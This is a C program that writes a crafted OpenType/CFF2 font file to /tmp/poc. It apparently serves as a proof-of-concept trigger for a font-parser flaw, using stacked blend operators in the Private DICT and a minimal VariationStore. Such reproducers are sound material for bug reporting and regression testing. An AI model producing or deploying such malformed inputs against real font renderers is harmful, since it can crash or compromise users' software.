#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_cff2_int(FILE *f, int32_t v) {
    if (v >= -107 && v <= 107) {
        fputc((uint8_t)(v + 139), f);
    } else if (v >= -1131 && v <= 1131) {
        fputc(28, f);
        write_uint16(f, (uint16_t)v);
    } else {
        fputc(29, f);
        write_uint32(f, (uint32_t)v);
    }
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OTTO header */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f);
    write_uint16(f, 1);
    write_uint16(f, 0); write_uint16(f, 0); write_uint16(f, 0);

    /* TableRecord: 'CFF2' */
    fputc('C', f); fputc('F', f); fputc('F', f); fputc('2', f);
    uint32_t table_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);

    uint32_t cff_start = ftell(f);

    /* CFF2 header */
    fputc(0x02, f); fputc(0x00, f); fputc(0x05, f);
    uint32_t top_dict_size_pos = ftell(f);
    write_uint16(f, 0);

    /* Top DICT */
    uint32_t top_dict_start = ftell(f);

    fputc(0x11, f);
    uint32_t charstrings_off_pos = ftell(f);
    write_cff2_int(f, 0);

    fputc(0x24, f);
    uint32_t fdarray_off_pos = ftell(f);
    write_cff2_int(f, 0);

    fputc(0x0C, f); fputc(0x19, f);
    uint32_t vstore_off_pos = ftell(f);
    write_cff2_int(f, 0);

    uint32_t top_dict_end = ftell(f);
    uint16_t top_dict_len = (uint16_t)(top_dict_end - top_dict_start);
    fseek(f, top_dict_size_pos, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* Global Subr INDEX (empty) */
    write_uint32(f, 0);

    /* FDArray (Font DICT INDEX) */
    uint32_t fdarray_start = ftell(f);

    /* Build Font DICT data in a buffer */
    uint8_t fd_buf[64];
    uint32_t fd_len = 0;

    /* Private operator (18) with two operands: size and offset */
    fd_buf[fd_len++] = 0x12;
    /* Use 4-byte integer prefix (29) for size */
    fd_buf[fd_len++] = 29;
    uint32_t priv_size_pos = fd_len;
    fd_len += 4;
    /* Use 4-byte integer prefix (29) for offset */
    fd_buf[fd_len++] = 29;
    uint32_t priv_off_pos = fd_len;
    fd_len += 4;

    /* Write Font DICT INDEX */
    write_uint32(f, 1);           /* count = 1 */
    fputc(0x01, f);               /* offSize = 1 */
    fputc(0x01, f);               /* offset[0] = 1 */
    fputc((uint8_t)(fd_len + 1), f); /* offset[1] = fd_len + 1 */
    fwrite(fd_buf, 1, fd_len, f);
    uint32_t fdarray_end = ftell(f);

    fseek(f, fdarray_off_pos, SEEK_SET);
    write_cff2_int(f, (int32_t)(fdarray_start - cff_start));
    fseek(f, fdarray_end, SEEK_SET);

    /* Private DICT */
    uint32_t priv_start = ftell(f);

    /* vsindex 0: push 0, then two-byte operator 0x0C 0x0A */
    fputc(0x8B, f);
    fputc(0x0C, f);
    fputc(0x0A, f);

    /* First blend: push 5 values, then single-byte op 0x17 */
    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8B, f); fputc(0x8B, f);
    fputc(0x8C, f);        /* push 1 = numBlends */
    fputc(0x17, f);        /* blend op */

    /* Second blend */
    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8B, f); fputc(0x8B, f);
    fputc(0x8C, f);
    fputc(0x17, f);

    uint32_t priv_end = ftell(f);
    uint32_t priv_size = priv_end - priv_start;
    uint32_t priv_off = priv_start - cff_start;

    /* Patch Private DICT size and offset in the Font DICT data */
    /* INDEX header: count(4) + offSize(1) + offset[0](1) + offset[1](1) = 7 bytes */
    uint32_t data_offset = fdarray_start + 7;
    fseek(f, data_offset + priv_size_pos, SEEK_SET);
    write_uint32(f, priv_size);
    fseek(f, data_offset + priv_off_pos, SEEK_SET);
    write_uint32(f, priv_off);
    fseek(f, priv_end, SEEK_SET);

    /* CharStrings INDEX */
    uint32_t charstrings_start = ftell(f);
    uint8_t cs_data[] = {0x0E};
    write_uint32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x02, f);
    fwrite(cs_data, 1, 1, f);
    uint32_t charstrings_end = ftell(f);

    fseek(f, charstrings_off_pos, SEEK_SET);
    write_cff2_int(f, (int32_t)(charstrings_start - cff_start));
    fseek(f, charstrings_end, SEEK_SET);

    /* VariationStore */
    uint32_t vstore_start = ftell(f);

    write_uint16(f, 1);        /* format = 1 */
    write_uint32(f, 16);       /* variationRegionListOffset = 16 */
    write_uint16(f, 1);        /* itemVariationDataCount = 1 */
    write_uint32(f, 8);        /* itemVariationDataOffsets[0] = 8 */

    /* ItemVariationData at offset 8 */
    write_uint16(f, 1);        /* itemCount = 1 */
    write_uint16(f, 0);        /* shortDeltaCount = 0 */
    write_uint16(f, 1);        /* regionIndexCount = 1 */
    write_uint16(f, 0);        /* regionIndexes[0] = 0 */

    /* VariationRegionList at offset 16 */
    write_uint16(f, 3);        /* axisCount = 3 */
    write_uint16(f, 1);        /* regionCount = 1 */
    write_uint16(f, 0); write_uint16(f, 0); write_uint16(f, 0);
    write_uint16(f, 0); write_uint16(f, 0); write_uint16(f, 0);
    write_uint16(f, 0); write_uint16(f, 0); write_uint16(f, 0);

    uint32_t vstore_end = ftell(f);

    fseek(f, vstore_off_pos, SEEK_SET);
    write_cff2_int(f, (int32_t)(vstore_start - cff_start));
    fseek(f, vstore_end, SEEK_SET);

    /* Patch table offsets */
    uint32_t file_end = ftell(f);
    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, 12);
    write_uint32(f, file_end - 12);

    fclose(f);
    return 0;
}